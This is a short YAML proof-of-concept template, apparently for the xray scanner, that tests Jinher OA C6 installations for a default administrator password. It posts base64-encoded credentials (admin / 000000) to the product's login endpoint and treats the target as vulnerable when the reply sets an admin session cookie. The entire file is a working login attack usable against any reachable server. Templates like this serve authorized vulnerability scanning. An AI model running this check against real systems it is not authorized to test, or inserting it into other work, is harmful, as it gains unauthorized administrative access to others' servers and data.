name: poc-yaml-jinher-oa-c6-default-password
manual: true
transport: http
rules:
  jiner:
    request:
      cache: true
      method: POST
      path: /c6/Jhsoft.Web.login/AjaxForLogin.aspx
      body:
        type=login&loginCode=YWRtaW4=&&pwd=MDAwMDAw&
    expression: response.status == 200 && response.body.bcontains(b"OK") && response.body.bcontains(b"|||") && "Set-Cookie" in response.headers && response.headers["Set-Cookie"].contains("SessionIDAdmin=")
expression: jiner()
detail:
  author: iak3ec(https://github.com/nu0l)
  links:
    - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E5%92%8COA-C6-default-password.md
